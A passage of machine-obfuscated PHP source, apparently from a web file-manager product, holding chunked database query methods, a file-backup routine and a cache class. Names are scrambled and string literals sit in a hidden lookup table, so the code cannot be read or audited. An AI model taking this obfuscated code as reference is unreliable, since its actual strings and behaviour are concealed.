self::textDecode($ìæâ×æ³); $š¼µùÎ[$¦ÀÆú×Á] = json_decode($ìæâ×æ³, !0); if (is_null($š¼µùÎ[$¦ÀÆú×Á])) { $š¼µùÎ[$¦ÀÆú×Á] = $ìæâ×æ³; } break; case $Çüà™¼[408]: if ($š¼µùÎ[$¦ÀÆú×Á] === $Çüà™¼[12]) { unset($š¼µùÎ[$¦ÀÆú×Á]); } break; case $Çüà™¼[409]: $š¼µùÎ[$¦ÀÆú×Á] = $¸ööÊùÃ[1]; break; default: break; } } } public function saveAll($½«Ï‡øè, $„Ÿ‚«‡ = false) { $ÅÜşùËè =& $_SERVER[‘ÆÜ‘œ]; $«¬¨õÕ = $this->db; $ŠøÇ©¸£ = $this->tablePrefix . $this->tableName; $Ç‘–¯ş½ = $this->saveAllChunkMake($½«Ï‡øè); $„Ÿ‚«‡ = is_array($„Ÿ‚«‡) ? $„Ÿ‚«‡ : array(); foreach ($Ç‘–¯ş½ as $çŸıÖïü) { $Ğµå†Íñ = $ÅÜşùËè[12]; $şÄ·ÒÍÄ = $ÅÜşùËè[12]; $§©¤ú¹ô = array(); $Å³ë»êÂ = array(); foreach ($çŸıÖïü as $Áæßùşõ => $“‰à´Áº) { $Ğµå†Íñ = $“‰à´Áº[$ÅÜşùËè[464]]; $Å³ë»êÂ[] = $“‰à´Áº[$ÅÜşùËè[465]]; $ÙßÙñó = $«¬¨õÕ->parseValue($“‰à´Áº[$ÅÜşùËè[465]]); foreach ($“‰à´Áº[$ÅÜşùËè[466]] as $ÕŞ–¢ıÚ => $£ê—¤…) { if (!$§©¤ú¹ô[$ÕŞ–¢ıÚ]) { $§©¤ú¹ô[$ÕŞ–¢ıÚ] = array(); } $§©¤ú¹ô[$ÕŞ–¢ıÚ][] = $ÅÜşùËè[467] . $ÙßÙñó . $ÅÜşùËè[468] . $«¬¨õÕ->parseValue($£ê—¤…); } } $õ‹’íØÊ = $Ğµå†Íñ; $õ‹’íØÊ = $«¬¨õÕ->parseKey($õ‹’íØÊ); foreach ($§©¤ú¹ô as $ÕŞ–¢ıÚ => $•‡¦ê›˜) { $şÄ·ÒÍÄ .= $ÅÜşùËè[286] . $«¬¨õÕ->parseKey($ÕŞ–¢ıÚ) . $ÅÜşùËè[469] . $õ‹’íØÊ . $ÅÜşùËè[470]; $şÄ·ÒÍÄ .= implode($ÅÜşùËè[286], $•‡¦ê›˜) . $ÅÜşùËè[471]; } $ì¿®ÔÂ‘ = $„Ÿ‚«‡; $ì¿®ÔÂ‘[$Ğµå†Íñ] = array($ÅÜşùËè[7], $Å³ë»êÂ); $éÁ ¥—Ë = "\x55\x50\x44\101\x54\x45\x20\x60{$ŠøÇ©¸£}\x60\40\x53\105\124\40" . rtrim($şÄ·ÒÍÄ, $ÅÜşùËè[50]) . $ÅÜşùËè[286] . $«¬¨õÕ->parseWhere($ì¿®ÔÂ‘); $this->execute($éÁ ¥—Ë); $this->chunkEventCheck(count($çŸıÖïü)); } $this->chunkEventSet(); } public function saveAllEach($ğ¹›ğ²Ğ, $±½¼‡—É = false) { $Àã¼ùü =& $_SERVER[‘ÆÜ‘œ]; $ÌÄ£¬Èù = $this->db; $†ñüÑö¶ = $this->tablePrefix . $this->tableName; $İ™½øÛò = $this->saveAllChunkMake($ğ¹›ğ²Ğ); $±½¼‡—É = is_array($±½¼‡—É) ? $±½¼‡—É : array(); foreach ($İ™½øÛò as $©©Êì„Û) { foreach ($©©Êì„Û as $’Û«İºš => $øÊ„Äüı) { $Ôş­¸õª = $Àã¼ùü[472]; foreach ($øÊ„Äüı[$Àã¼ùü[466]] as $íÆú¦íİ => $øÇÛ„Œ) { $Ôş­¸õª .= $ÌÄ£¬Èù->parseKey($íÆú¦íİ) . $Àã¼ùü[473] . $ÌÄ£¬Èù->parseValue($øÇÛ„Œ) . $Àã¼ùü[50]; } $¾ÊÄİÒÔ = $±½¼‡—É; $¾ÊÄİÒÔ[$øÊ„Äüı[$Àã¼ùü[464]]] = $øÊ„Äüı[$Àã¼ùü[465]]; $Áé  Îë = "\x55\120\104\x41\124\x45\40\x60{$†ñüÑö¶}\x60\x20\x53\x45\124\x20" . rtrim($Ôş­¸õª, $Àã¼ùü[50]) . $Àã¼ùü[474] . $ÌÄ£¬Èù->parseWhere($¾ÊÄİÒÔ) . $Àã¼ùü[475]; $this->execute($Áé  Îë); } $this->chunkEventCheck(count($©©Êì„Û)); } $this->chunkEventSet(); } private function saveAllChunkMake($¶ÍÔãÛ§) { $•Çû¯ñ =& $_SERVER[‘ÆÜ‘œ]; $é”ı«»« = self::SQL_WHERE_IN_CHUNK; $¶ÍÔãÛ§ = is_array($¶ÍÔãÛ§) ? $¶ÍÔãÛ§ : array(); $–ıÙ…Áä = array(); $õÛ÷Ãè… = ceil(count($¶ÍÔãÛ§) / $é”ı«»«); for ($¦¢¶ƒÜı = 0; $¦¢¶ƒÜı < $õÛ÷Ãè…; $¦¢¶ƒÜı++) { $•¿¿Ïû´ = array(); $¢ÁˆÜÚò = array_slice($¶ÍÔãÛ§, $¦¢¶ƒÜı * $é”ı«»«, $é”ı«»«); foreach ($¢ÁˆÜÚò as $è“´¸çš) { if (!is_array($è“´¸çš) || count($è“´¸çš) < 4 || count($è“´¸çš) % 2 != 0) { continue; } $Ú¨æ’¦ = array(); for ($ï²ëıè = 2; $ï²ëıè < count($è“´¸çš); $ï²ëıè += 2) { $Ú¨æ’¦[$è“´¸çš[$ï²ëıè]] = $è“´¸çš[$ï²ëıè + 1]; } $•¿¿Ïû´[] = array($•Çû¯ñ[464] => $è“´¸çš[0], $•Çû¯ñ[465] => $è“´¸çš[1], $•Çû¯ñ[466] => $Ú¨æ’¦); } $–ıÙ…Áä[] = $•¿¿Ïû´; } return $–ıÙ…Áä; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ëşİå£Ñ = false, $Ë ÇìıÒ = false) { $this->_chunkEvent = $ëşİå£Ñ; $this->_chunkEventParam = $Ë ÇìıÒ; } private function chunkEventCheck($Ô¶«¨±Ü) { if (!$this->_chunkEvent) { return; } $«†³ÓÓ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $«†³ÓÓ[$_SERVER[‘ÆÜ‘œ][476]] = $Ô¶«¨±Ü; Hook::trigger($this->_chunkEvent, $«†³ÓÓ); } public function addAll($¨Ê‘šƒÁ, $Ş¨úÄ¹ã = array(), $µ•öıç” = false) { $‘Ãëâè =& $_SERVER[‘ÆÜ‘œ]; ignore_timeout(); $ƒ•ç»ƒ = self::SQL_WHERE_IN_CHUNK; if (empty($¨Ê‘šƒÁ)) { $this->error = think_lang($‘Ãëâè[359]); return !1; } $Ş¨úÄ¹ã = $this->_parseOptions($Ş¨úÄ¹ã); foreach ($¨Ê‘šƒÁ as $¶é¥Œõ§ => $¤¨ïÀ˜´) { $¨Ê‘šƒÁ[$¶é¥Œõ§] = $this->_facade($¤¨ïÀ˜´); $this->_beforeInsert($¨Ê‘šƒÁ[$¶é¥Œõ§], $Ş¨úÄ¹ã); } if (method_exists($this->db, $‘Ãëâè[360])) { for ($³Ù¦©§ = 0; $³Ù¦©§ < count($¨Ê‘šƒÁ); $³Ù¦©§ += $ƒ•ç»ƒ) { $íÒ¦¬” = array_slice($¨Ê‘šƒÁ, $³Ù¦©§, $ƒ•ç»ƒ); if (!is_array($íÒ¦¬”) || count($íÒ¦¬”) == 0) { break; } $‹ó®«çø = $this->db->insertAll($íÒ¦¬”, $Ş¨úÄ¹ã, $µ•öıç”); $this->chunkEventCheck(count($íÒ¦¬”)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¨Ê‘šƒÁ as $¶é¥Œõ§ => $¤¨ïÀ˜´) { $‹ó®«çø = $this->db->insert($¤¨ïÀ˜´, $Ş¨úÄ¹ã, $µ•öıç”); } $this->commit(); } if (!1 !== $‹ó®«çø) { $Ó‰š–­Ò = $this->getLastInsID(); if ($Ó‰š–­Ò) { return $Ó‰š–­Ò; } } return $‹ó®«çø; } public function save($Ê¶û‘ = '', $†¦…¡¿Ö = array()) { $¥ÀÁ¿€ğ =& $_SERVER[‘ÆÜ‘œ]; $Ó·¹¨¸Ó = self::SQL_WHERE_IN_CHUNK; $½ø®£¯ = $this->optionsValue(); $¾ˆğ½æƒ = $this->findWhereField($½ø®£¯); if (!$¾ˆğ½æƒ) { return parent::save($Ê¶û‘, $†¦…¡¿Ö); } $˜ĞÑ•’ì = 0; $À¾õ¸ş” = $½ø®£¯[$¥ÀÁ¿€ğ[363]][$¾ˆğ½æƒ][1]; $À¾õ¸ş” = is_array($À¾õ¸ş”) ? $À¾õ¸ş” : array(); $º¥Ê‚ÓÉ = count($À¾õ¸ş”); for ($Á€İ®€õ = 0; $Á€İ®€õ < $º¥Ê‚ÓÉ; $Á€İ®€õ += $Ó·¹¨¸Ó) { $²·¬â = array_slice($À¾õ¸ş”, $Á€İ®€õ, $Ó·¹¨¸Ó); if (!is_array($²·¬â) || count($²·¬â) == 0) { break; } $½ø®£¯[$¥ÀÁ¿€ğ[363]][$¾ˆğ½æƒ][1] = $²·¬â; $this->optionsValue($½ø®£¯); $˜ĞÑ•’ì += parent::save($Ê¶û‘, $†¦…¡¿Ö); $this->chunkEventCheck(count($²·¬â)); } $this->chunkEventSet(); return $˜ĞÑ•’ì; } public function add($ÙïÛ¼¨ = '', $ ›İâ®ü = array(), $èˆÂ–Ë› = false) { if ($this->addTaskStatus && is_array($ÙïÛ¼¨)) { $this->addTaskData[] = $ÙïÛ¼¨; return; } return parent::add($ÙïÛ¼¨, $ ›İâ®ü, $èˆÂ–Ë›); } public function parseWhereLike($˜ó³êæ§, $¡‘Âùíà = '', $‹í‹‹µé = false, &$öŸµÄƒö = false) { $ËÜÒ²âí =& $_SERVER[‘ÆÜ‘œ]; $³–œƒÔ = $GLOBALS[$ËÜÒ²âí[6]][$ËÜÒ²âí[477]]; if (!$³–œƒÔ[$ËÜÒ²âí[478]]) { return $˜ó³êæ§; } if (!in_array($this->tableName, array($ËÜÒ²âí[479], $ËÜÒ²âí[480], $ËÜÒ²âí[481]))) { return $˜ó³êæ§; } if (!is_array($˜ó³êæ§)) { return $˜ó³êæ§; } $ş¨åÆ÷à = array(); $ÂÆ˜Üæ³ = 0; foreach ($˜ó³êæ§ as $¯Ìûë·› => $™¨Ä†î¸) { if (is_array($™¨Ä†î¸) && count($™¨Ä†î¸) == 2 && $™¨Ä†î¸[0] == $ËÜÒ²âí[482] && is_string($™¨Ä†î¸[1]) && substr($™¨Ä†î¸[1], 0, 1) == $ËÜÒ²âí[483] && substr($™¨Ä†î¸[1], strlen($™¨Ä†î¸[1]) - 1, 1) == $ËÜÒ²âí[483]) { $öŸµÄƒö = !0; $°Ë§Û¹à = is_string($¯Ìûë·›) ? $¯Ìûë·› : $¡‘Âùíà; $ıæ³«ˆØ = substr($™¨Ä†î¸[1], 1, strlen($™¨Ä†î¸[1]) - 2); $ıæ³«ˆØ = $this->db->escapeString($ıæ³«ˆØ); if (!strpos($°Ë§Û¹à, $ËÜÒ²âí[10])) { $°Ë§Û¹à = $ËÜÒ²âí[484] . $°Ë§Û¹à . $ËÜÒ²âí[484]; } $ÌÀÆøÒ² = $ËÜÒ²âí[221] . $ıæ³«ˆØ . $ËÜÒ²âí[221]; $ıæ³«ˆØ = str_replace(array($ËÜÒ²âí[10], $ËÜÒ²âí[485], $ËÜÒ²âí[11]), $ËÜÒ²âí[486], $ıæ³«ˆØ); if ($³–œƒÔ[$ËÜÒ²âí[487]]) { $ÌÀÆøÒ² = $ËÜÒ²âí[488] . $ıæ³«ˆØ . $ËÜÒ²âí[489]; if ($³–œƒÔ[$ËÜÒ²âí[490]]) { $ÌÀÆøÒ² = $ËÜÒ²âí[489] . $ıæ³«ˆØ . $ËÜÒ²âí[488]; } } $ş¨åÆ÷à[$ÂÆ˜Üæ³] = $ËÜÒ²âí[491] . $°Ë§Û¹à . $ËÜÒ²âí[492] . $ÌÀÆøÒ² . $ËÜÒ²âí[493]; $ÂÆ˜Üæ³++; continue; } if (is_array($™¨Ä†î¸)) { $¡‘Âùíà = is_string($¯Ìûë·›) ? $¯Ìûë·› : $¡‘Âùíà; $™¨Ä†î¸ = $this->parseWhereLike($™¨Ä†î¸, $¡‘Âùíà, !0, $öŸµÄƒö); } if (is_numeric($¯Ìûë·›)) { $ş¨åÆ÷à[$ÂÆ˜Üæ³] = $™¨Ä†î¸; $ÂÆ˜Üæ³++; } else { $ş¨åÆ÷à[$¯Ìûë·›] = $™¨Ä†î¸; } } if ($öŸµÄƒö && !$‹í‹‹µé) { } return $ş¨åÆ÷à; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‚ÇÖ«ÂÕ = array()) { $“€Ÿ½µÔ =& $_SERVER[‘ÆÜ‘œ]; $ààÀ×Õı = self::SQL_WHERE_IN_CHUNK; $üˆã”ÃÚ = $this->optionsValue(); $¿µÍ•ú = $this->findWhereField($üˆã”ÃÚ); if (!$¿µÍ•ú || isset($üˆã”ÃÚ[$“€Ÿ½µÔ[378]]) || isset($üˆã”ÃÚ[$“€Ÿ½µÔ[438]])) { return parent::select($‚ÇÖ«ÂÕ); } $•íï“ĞÕ = $üˆã”ÃÚ[$“€Ÿ½µÔ[363]][$¿µÍ•ú][1]; $•íï“ĞÕ = is_array($•íï“ĞÕ) ? $•íï“ĞÕ : array(); $Ïå…‘ûº = null; for ($¯öš×µİ = 0; $¯öš×µİ < count($•íï“ĞÕ); $¯öš×µİ += $ààÀ×Õı) { $ñ×á•Âı = array_slice($•íï“ĞÕ, $¯öš×µİ, $ààÀ×Õı); if (!is_array($ñ×á•Âı) || count($ñ×á•Âı) == 0) { break; } $üˆã”ÃÚ[$“€Ÿ½µÔ[363]][$¿µÍ•ú][1] = $ñ×á•Âı; $this->optionsValue($üˆã”ÃÚ); $üäòÕÆÚ = parent::select($‚ÇÖ«ÂÕ); if (!$üäòÕÆÚ) { continue; } $Ïå…‘ûº = is_array($Ïå…‘ûº) ? $Ïå…‘ûº : array(); $Ïå…‘ûº = array_merge($Ïå…‘ûº, $üäòÕÆÚ); } return $Ïå…‘ûº; } public function delete($ûù×ó = array()) { $—µ¢ãÛ =& $_SERVER[‘ÆÜ‘œ]; $ÍØÎ¨µ = self::SQL_WHERE_IN_CHUNK; $Œ“ª›ø´ = $this->optionsValue(); $Î’Ñ›æ = $this->findWhereField($Œ“ª›ø´); if (!$Î’Ñ›æ) { return parent::delete($ûù×ó); } $„“ñ¡— = 0; $®şêğğ¿ = $Œ“ª›ø´[$—µ¢ãÛ[363]][$Î’Ñ›æ][1]; $®şêğğ¿ = is_array($®şêğğ¿) ? $®şêğğ¿ : array(); for ($ÀµşŸÔ‚ = 0; $ÀµşŸÔ‚ < count($®şêğğ¿); $ÀµşŸÔ‚ += $ÍØÎ¨µ) { $¨‘×“’Ó = array_slice($®şêğğ¿, $ÀµşŸÔ‚, $ÍØÎ¨µ); if (!is_array($¨‘×“’Ó) || count($¨‘×“’Ó) == 0) { break; } $Œ“ª›ø´[$—µ¢ãÛ[363]][$Î’Ñ›æ][1] = $¨‘×“’Ó; $this->optionsValue($Œ“ª›ø´); $„“ñ¡— += parent::delete($ûù×ó); } return $„“ñ¡—; } private function findWhereField($±€É„¾) { $‹šÜÁı =& $_SERVER[‘ÆÜ‘œ]; $õñÛ‚¯ = self::SQL_WHERE_IN_CHUNK; if (!is_array($±€É„¾) || !is_array($±€É„¾[$‹šÜÁı[363]])) { return !1; } foreach ($±€É„¾[$‹šÜÁı[363]] as $ı§š–úˆ => $Â™Áî¸ê) { if (is_array($Â™Áî¸ê) && isset($Â™Áî¸ê[0]) && is_string($Â™Áî¸ê[0]) && strtolower($Â™Áî¸ê[0]) == $‹šÜÁı[7] && is_array($Â™Áî¸ê[1]) && count($Â™Áî¸ê[1]) > $õñÛ‚¯) { ignore_timeout(); return $ı§š–úˆ; } } return !1; } public function setMasterDB($´ÒÆàä° = true) { think_config($_SERVER[‘ÆÜ‘œ][494], $´ÒÆàä°); } } goto aÉà»Îñ˜ï; CÍñ¥Ö×—É: class BackupFile { public function __construct() { } public function index() { $‡ø°°ÛØ = Backup::get(); $ùÆ…Ÿ¹® = $‡ø°°ÛØ[$_SERVER[‘ÆÜ‘œ][863]][$_SERVER[‘ÆÜ‘œ][231]][$_SERVER[‘ÆÜ‘œ][565]]; $Åö¿Ã‡ = array($_SERVER[‘ÆÜ‘œ][566] => array($_SERVER[‘ÆÜ‘œ][921], $ùÆ…Ÿ¹®), $_SERVER[‘ÆÜ‘œ][922] => array($_SERVER[‘ÆÜ‘œ][416], $‡ø°°ÛØ[$_SERVER[‘ÆÜ‘œ][859]])); $úìú¥Ö¸ = (int) Model($_SERVER[‘ÆÜ‘œ][900])->where($Åö¿Ã‡)->count($_SERVER[‘ÆÜ‘œ][565]); $§Ë‰Ì°ß = (int) Model($_SERVER[‘ÆÜ‘œ][900])->where($Åö¿Ã‡)->sum($_SERVER[‘ÆÜ‘œ][79]); $½ü‡…§Û = new TaskFileTransfer($_SERVER[‘ÆÜ‘œ][923], $_SERVER[‘ÆÜ‘œ][887], $úìú¥Ö¸, LNG($_SERVER[‘ÆÜ‘œ][895]) . $_SERVER[‘ÆÜ‘œ][896] . LNG($_SERVER[‘ÆÜ‘œ][924])); $½ü‡…§Û->task[$_SERVER[‘ÆÜ‘œ][871]] = $§Ë‰Ì°ß; $ÍËâß¢¾ = array($_SERVER[‘ÆÜ‘œ][925] => $úìú¥Ö¸, $_SERVER[‘ÆÜ‘œ][926] => $§Ë‰Ì°ß, $_SERVER[‘ÆÜ‘œ][927] => time()); Backup::set($ÍËâß¢¾); $æÉØ­×Ÿ = !0; $åî†­æ´ = $this->storeIds(); $Õø£áÈù = 1; $­¢Ë¸Ÿš = 1000; $”ïò«Ö = $ŒİÔ±ª£ = 0; $€§·³¥Ó = array(); $ç÷ËĞ«ú = $êô„Á‰ö = 0; do { $ü¦ÜĞâ› = $_SERVER[‘ÆÜ‘œ][928]; $ÚûàÔ†é = Model($_SERVER[‘ÆÜ‘œ][900])->where($Åö¿Ã‡)->field($ü¦ÜĞâ›)->order($_SERVER[‘ÆÜ‘œ][929])->selectPage($­¢Ë¸Ÿš, $Õø£áÈù); $šÓ—šßÈ = !empty($ÚûàÔ†é[$_SERVER[‘ÆÜ‘œ][455]]) ? $ÚûàÔ†é[$_SERVER[‘ÆÜ‘œ][455]] : array(); foreach ($šÓ—šßÈ as $ù–ë½Ñè) { if (!$this->_fileExist($ù–ë½Ñè, $€§·³¥Ó, $åî†­æ´)) { Backup::log($_SERVER[‘ÆÜ‘œ][930] . $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][565]] . $_SERVER[‘ÆÜ‘œ][931] . $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][87]]); continue; } $öØìÃø” = $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][87]]; $üÜëÓŸ = "\x7b\x69\x6f\x3a{$‡ø°°ÛØ[$_SERVER[‘ÆÜ‘œ][859]]}\175" . substr($öØìÃø”, strlen("\x7b\x69\157\72{$ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][932]]}\175")); if (IO::exist($üÜëÓŸ)) { $½ü‡…§Û->updateFileEnd($ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][32]], $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][79]]); } else { $üÜëÓŸ = get_path_father($üÜëÓŸ); IO::mkdir($üÜëÓŸ); if (!IO::copy($öØìÃø”, $üÜëÓŸ, $_SERVER[‘ÆÜ‘œ][933])) { Backup::log($_SERVER[‘ÆÜ‘œ][934] . $öØìÃø” . $_SERVER[‘ÆÜ‘œ][918] . $üÜëÓŸ . $_SERVER[‘ÆÜ‘œ][176]); $æÉØ­×Ÿ = !1; break; } } $ùÆ…Ÿ¹® = $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][565]]; $ŒİÔ±ª£ += 1; $”ïò«Ö += $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][79]]; $êô„Á‰ö += 1; $ç÷ËĞ«ú += $ù–ë½Ñè[$_SERVER[‘ÆÜ‘œ][79]]; if ($”ïò«Ö >= 1024 * 1024 * 100) { $ÍËâß¢¾ = array($_SERVER[‘ÆÜ‘œ][858] => $ùÆ…Ÿ¹®, $_SERVER[‘ÆÜ‘œ][935] => $êô„Á‰ö, $_SERVER[‘ÆÜ‘œ][936] => $ç÷ËĞ«ú); Backup::set($ÍËâß¢¾); $”ïò«Ö = $ŒİÔ±ª£ = 0; } } $†Áï‰Å = count($šÓ—šßÈ); $Õø£áÈù++; } while ($†Áï‰Å == $­¢Ë¸Ÿš); $½ü‡…§Û->end(); $ÍËâß¢¾ = array($_SERVER[‘ÆÜ‘œ][937] => 1, $_SERVER[‘ÆÜ‘œ][869] => time(), $_SERVER[‘ÆÜ‘œ][885] => 1, $_SERVER[‘ÆÜ‘œ][858] => $ùÆ…Ÿ¹®, $_SERVER[‘ÆÜ‘œ][938] => time()); if ($ŒİÔ±ª£) { $ÍËâß¢¾[$_SERVER[‘ÆÜ‘œ][935]] = $êô„Á‰ö; $ÍËâß¢¾[$_SERVER[‘ÆÜ‘œ][936]] = $ç÷ËĞ«ú; } Backup::set($ÍËâß¢¾); return !0; } private function _fileExist($´¹ Ø­, &$´¾æ¶õ, $Œ‹‹ÎÂÑ) { $ï½Øııç =& $_SERVER[‘ÆÜ‘œ]; $×¾µè¿ = $´¹ Ø­[$ï½Øııç[87]]; if (in_array($´¹ Ø­[$ï½Øııç[565]], $´¾æ¶õ)) { return !1; } if (!in_array($´¹ Ø­[$ï½Øııç[932]], $Œ‹‹ÎÂÑ)) { return !1; } if (IO::exist($×¾µè¿)) { return !0; } $Ñ÷‹¤¡Ù = get_path_father($×¾µè¿); if (IO::exist($Ñ÷‹¤¡Ù)) { $´¾æ¶õ[] = $´¹ Ø­[$ï½Øııç[565]]; return !1; } $ˆÃÔ¿™ˆ = array($ï½Øııç[932] => $´¹ Ø­[$ï½Øııç[932]], $ï½Øııç[87] => array($ï½Øııç[482], "{$Ñ÷‹¤¡Ù}\45")); $»·°¦¢ğ = Model($ï½Øııç[900])->where($ˆÃÔ¿™ˆ)->field($ï½Øııç[566])->select(); $´¾æ¶õ = array_merge($´¾æ¶õ, array_to_keyvalue($»·°¦¢ğ, $ï½Øııç[12], $ï½Øııç[565])); return !1; } private function _fileFilter($Ø‡†ƒ£) { $È‚İ‘¤ğ =& $_SERVER[‘ÆÜ‘œ]; return; if (empty($Ø‡†ƒ£)) { return; } $èØĞğ¥ = array($È‚İ‘¤ğ[565] => array($È‚İ‘¤ğ[7], array_unique($Ø‡†ƒ£))); $Ş¥ößœŠ = Model($È‚İ‘¤ğ[939])->where($èØĞğ¥)->field($È‚İ‘¤ğ[192])->select(); foreach ($Ş¥ößœŠ as $á‰ó¯€à) { Model($È‚İ‘¤ğ[939])->remove($á‰ó¯€à[$È‚İ‘¤ğ[192]], !1); } } private function storeIds() { $ÓçÀõ’£ =& $_SERVER[‘ÆÜ‘œ]; $ì£«¡å = Model($ÓçÀõ’£[875])->listData(); $‘Ô»Š¤¶ = array(); $³ìÈ²Ö = $GLOBALS[$ÓçÀõ’£[6]][$ÓçÀõ’£[92]][$ÓçÀõ’£[940]]; foreach ($ì£«¡å as $ØÏ„Ãªâ) { $±êı”ú¾ = strtolower($ØÏ„Ãªâ[$ÓçÀõ’£[96]]); if (!isset($³ìÈ²Ö[$±êı”ú¾])) { continue; } $ ñ¿ëË© = $ÓçÀõ’£[77] . (isset($³ìÈ²Ö[$±êı”ú¾]) ? $³ìÈ²Ö[$±êı”ú¾] : ucfirst($±êı”ú¾)); if (!class_exists($ ñ¿ëË©)) { continue; } $‘Ô»Š¤¶[] = $ØÏ„Ãªâ[$ÓçÀõ’£[495]]; } return $‘Ô»Š¤¶; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ò’êö¯Ø =& $_SERVER[‘ÆÜ‘œ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $¢ú†Èš¯ = $GLOBALS[$ò’êö¯Ø[6]][$ò’êö¯Ø[434]]; $ÊÚÀê = $¢ú†Èš¯[$¢ú†Èš¯[$ò’êö¯Ø[941]]]; $ÊéÉ‡¸ = $¢ú†Èš¯[$ò’êö¯Ø[942]]; switch ($¢ú†Èš¯[$ò’êö¯Ø[941]]) { case $ò’êö¯Ø[21]: self::$handle = Model($ò’êö¯Ø[943]); break; case $ò’êö¯Ø[944]: self::$handle = new CacheRedis($ÊÚÀê, $ÊéÉ‡¸); break; case $ò’êö¯Ø[945]: self::$handle = new CacheMemcached($ÊÚÀê, $ÊéÉ‡¸); break; case $ò’êö¯Ø[231]: self::$handle = new CacheFile($ÊÚÀê, $ÊéÉ‡¸); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($É Ôşö) { if (is_array($É Ôşö) || is_object($É Ôşö)) { $É Ôşö = json_encode($É Ôşö); } $É Ôşö = rawurlencode($É Ôşö); return md5(KOD_SITE_ID . $_SERVER[‘ÆÜ‘œ][11] . $É Ôşö); } public static function get($ùØ«•, $•ß‡Åü = false) { $Ğë£­ñˆ = self::key($ùØ«•); $â™ºèè™ = self::init(); if ($•ß‡Åü) { return unserialize($â™ºèè™->get($Ğë£­ñˆ)); } if (!isset(self::$memoryCache[$Ğë£­ñˆ])) { $şìÍœû = $â™ºèè™->get($Ğë£­ñˆ); self::$memoryCache[$Ğë£­ñˆ] = unserialize($şìÍœû); } return self::$memoryCache[$Ğë£­ñˆ]; } public static function set($ï¯÷˜Í, $ï¬ù£Š›, $Á—€É» = false) { $ê—»è»ì =& $_SERVER[‘ÆÜ‘œ]; $÷îºáğ¨ = self::key($ï¯÷˜Í); if (isset(self::$memoryCache[$÷îºáğ¨]) && self::$memoryCache[$÷îºáğ¨] === $ï¬ù£Š›) { return !0; } if ($Á—€É» === 0) { self::$memoryCache[$÷îºáğ¨] = $ï¬ù£Š›; return !0; } $šİåµğ¯ = self::init(); $”¼í•°€ = serialize($ï¬ù£Š›); CacheLock::lock($ï¯÷˜Í . $ê—»è»ì[946]); $²œëÏ¤… = $šİåµğ¯->set($÷îºáğ¨, $”¼í•°€, $Á—€É»); self::$memoryCache[$÷îºáğ¨] = $ï¬ù£Š›; CacheLock::unlock($ï¯÷˜Í . $ê—»è»ì[946]); return $²œëÏ¤…; } public static function getCall($ã¡øàÈº, $ëŠëì…ƒ, $ìàÇŸÓæ, $ºé¤äóß = array()) { $Š¾–óØê =& $_SERVER[‘ÆÜ‘œ]; $ÔÀÈ‡ãø = self::get($ã¡øàÈº); if ($ÔÀÈ‡ãø || $ÔÀÈ‡ãø === $Š¾–óØê[12]) { return $ÔÀÈ‡ãø; } $ÔÀÈ‡ãø = call_user_func_array($ìàÇŸÓæ, $ºé¤äóß); $ÔÀÈ‡ãø = $ÔÀÈ‡ãø ? $ÔÀÈ‡ãø : $Š¾–óØê[12]; self::set($ã¡øàÈº, $ÔÀÈ‡ãø, $ëŠëì…ƒ); return $ÔÀÈ‡ãø; } public static function limitCall($Œ÷á«˜, $Ô‰ğÍÂ = 15, $½Îà¼üş = 30, $—ØÊóã = true) { $·ÒÇ½Ü½ =& $_SERVER[‘ÆÜ‘œ]; static $êš¬‚Î… = array(); if ($—ØÊóã) { $Œ÷á«˜ = $Œ÷á«˜ . $·ÒÇ½Ü½[947] . KodUser::id() . $·ÒÇ½Ü½[948] . get_client_ip(); } if (isset($êš¬‚Î…[$Œ÷á«˜]) && is_array($êš¬‚Î…[$Œ÷á«˜])) { return $êš¬‚Î…[$Œ÷á«˜][$·ÒÇ½Ü½[342]] <= $½Îà¼üş; } $¬•Ä’Ì¼ = self::get($Œ÷á«˜); if (!is_array($¬•Ä’Ì¼) || time() - $¬•Ä’Ì¼[$·ÒÇ½Ü½[205]] > $Ô‰ğÍÂ) { $¬•Ä’Ì¼ = array($·ÒÇ½Ü½[205] => time(), $·ÒÇ½Ü½[342] => 0); } $¬•Ä’Ì¼[$·ÒÇ½Ü½[342]]++; self::set($Œ÷á«˜, $¬•Ä’Ì¼, $Ô‰ğÍÂ); $êš¬‚Î…[$Œ÷á«˜] = $¬•Ä’Ì¼; return $¬•Ä’Ì¼[$·ÒÇ½Ü½[342]] <= $½Îà¼üş; } public static function limitRuntime($¡ú†Ä¯Ú, $Â€öÇŸÄ) { $å…±äç = $_SERVER[‘ÆÜ‘œ][949] . $¡ú†Ä¯Ú; if (isset(self::$runTimeCache[$å…±äç]) || !$Â€öÇŸÄ) { return !0; } $…›Ñİ¬® = intval(self::get($å…±äç)); $…›Ñİ¬® = !$…›Ñİ¬® || $…›Ñİ¬® <= 0 ? 1 : $…›Ñİ¬® + 1; if ($…›Ñİ¬® > $Â€öÇŸÄ) { return !1; } self::$runTimeCache[$å…±äç] = !0; self::set($å…±äç, $…›Ñİ¬®, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $œïÇïÌ => $×£»Ö‘º) { $º‡ˆçƒ¨ = intval(self::get($œïÇïÌ)); $º‡ˆçƒ¨ = !$º‡ˆçƒ¨ || $º‡ˆçƒ¨ <= 1 ? 0 : $º‡ˆçƒ¨ - 1; self::set($œïÇïÌ, $º‡ˆçƒ¨, 3600); } self::$runTimeCache = array(); } public static function remove($Ö”‡ïÁø) { $§š•ØæÃ = 